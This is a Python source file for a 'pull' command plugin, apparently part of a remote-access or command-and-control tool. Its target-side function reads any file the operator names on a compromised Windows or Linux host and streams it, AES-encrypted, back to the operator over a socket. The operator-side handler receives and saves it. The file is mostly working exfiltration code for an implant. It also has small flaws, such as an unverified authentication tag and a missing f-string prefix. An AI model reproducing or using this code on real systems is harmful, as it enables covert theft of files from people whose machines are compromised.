from Crypto.Cipher import AES
from .interfaces import CommandPlugin
import os
import pathlib
import tqdm

class PullCommand(CommandPlugin):
    def getShortname(targetPath, operatorPath):
        """Parse paths to determine short name of file being saved"""
        fromTarget = False
        # don't check if path is directory if call is recursive
        if targetPath != operatorPath:
            # if operatorPath is a directory, get file name from target path
            if os.path.isdir(operatorPath):
                shortname, _ = PullCommand.getShortname(targetPath, targetPath)
                fromTarget = True
                return (shortname, fromTarget)
        # cut file name out of full path
        if "/" in operatorPath:
            shortname = operatorPath[operatorPath.rindex("/"):]
        elif "\\" in operatorPath:
            shortname = operatorPath[operatorPath.rindex("\\"):]
        else:
            shortname = operatorPath
        return (shortname, fromTarget)

    def handler(argv, socket, cipherKey):
        try:
            command, targetPath, operatorPath = argv
        except:
            print("Error: couldn't parse command. Please check args and try again")
            return
        # expand '..', '.', and '~' to full path and remove trailing /'s
        p = pathlib.Path(operatorPath)
        operatorPath = str(p.resolve())
        # get name of file to be saved
        shortname, nameFromTarget = PullCommand.getShortname(targetPath, operatorPath)
        # receive file size
        nonce = socket.recv(16)
        tag = socket.recv(16)
        ciphertext = socket.recv(44)
        cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
        message = cipher.decrypt(ciphertext)
        try:
            filesize = int(message)
        except ValueError:
            errorMessage = message.decode()
            print("Error message from target: '{errorMessage}'. Please check args and try again")
            return
        # make directories that don't exist yet and open file for receiving
        if nameFromTarget:
            try:
                os.makedirs(operatorPath)
            except FileExistsError:
                pass
            pulledFile = open(operatorPath + "/" + shortname, "wb")
        else:
            try:
                if "/" in operatorPath or "\\" in operatorPath:
                    os.makedirs(operatorPath[:operatorPath.rindex(shortname)])
            except FileExistsError:
                pass
            pulledFile = open(operatorPath, "wb")
        # send ready-to-receive signal
        cipher = AES.new(cipherKey, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(b"READY")
        socket.sendall(nonce)
        socket.sendall(tag)
        socket.sendall(ciphertext)
        # start receiving file
        progress = tqdm.tqdm(range(filesize), "Receiving file", unit="B", unit_scale=True, unit_divisor=1024)
        while True:
            # receive file chunk (up to 2KB at a time)
            buffersize = min(2048, filesize-progress.n)
            nonce = socket.recv(16)
            tag = socket.recv(16)
            ciphertext = socket.recv(buffersize)
            # make sure we received full ciphertext
            remaining = buffersize - len(ciphertext)
            while remaining:
                moreCiphertext = socket.recv(remaining)
                ciphertext += moreCiphertext
                remaining = buffersize - len(ciphertext)
            # decrypt chunk and save to file
            cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
            bytesRead = cipher.decrypt(ciphertext)
            pulledFile.write(bytesRead)
            progress.update(len(bytesRead))
            if progress.n >= filesize:
                # done receiving file
                progress.close()
                break
        print("Done.")
        # file received
        pulledFile.close()
        return

    def target(argv, socket, cipherKey):
        """Send a file to operator host (platform-agnostic)"""
        try:
            command, targetPath, operatorPath = argv
        except Exception as e:
            # Error: couldn't parse command -- terminate command
            return
        # expand '..', '.', and '~' to full path
        p = pathlib.Path(targetPath)
        targetPath = str(p.resolve())
        # make sure path points to an existing file
        if os.path.isdir(targetPath) or not p.exists():
            # send error message to operator and terminate command
            cipher = AES.new(cipherKey, AES.MODE_EAX)
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest("target path does not exist or is a directory".encode())
            socket.sendall(nonce)
            socket.sendall(tag)
            socket.sendall(ciphertext)
            return
        # send file size
        filesize = os.path.getsize(targetPath)
        cipher = AES.new(cipherKey, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(str(filesize).encode())
        socket.sendall(nonce)
        socket.sendall(tag)
        socket.sendall(ciphertext)
        # wait for ready signal
        nonce = socket.recv(16)
        tag = socket.recv(16)
        ciphertext = socket.recv(2048)
        cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
        signal = cipher.decrypt(ciphertext)
        if signal.decode() != "READY":
            # ready signal garbled in transit
            pass
        # send file
        with open(targetPath, "rb") as pullFile:
            while True:
                bytesRead = pullFile.read(2048)
                if not bytesRead:
                    # done sending file
                    break
                # send file chunk
                cipher = AES.new(cipherKey, AES.MODE_EAX)
                nonce = cipher.nonce
                ciphertext, tag = cipher.encrypt_and_digest(bytesRead)
                socket.sendall(nonce)
                socket.sendall(tag)
                socket.sendall(ciphertext)
        # file sent
        return

    def windowsTarget(argv, socket, cipherKey):
        """Call platform-agnostic function to send a file to operator host"""
        PullCommand.target(argv, socket, cipherKey)
        return

    def linuxTarget(argv, socket, cipherKey):
        """Call platform-agnostic function to send a file to operator host"""
        PullCommand.target(argv, socket, cipherKey)
        return

    def name():
        return "pull"
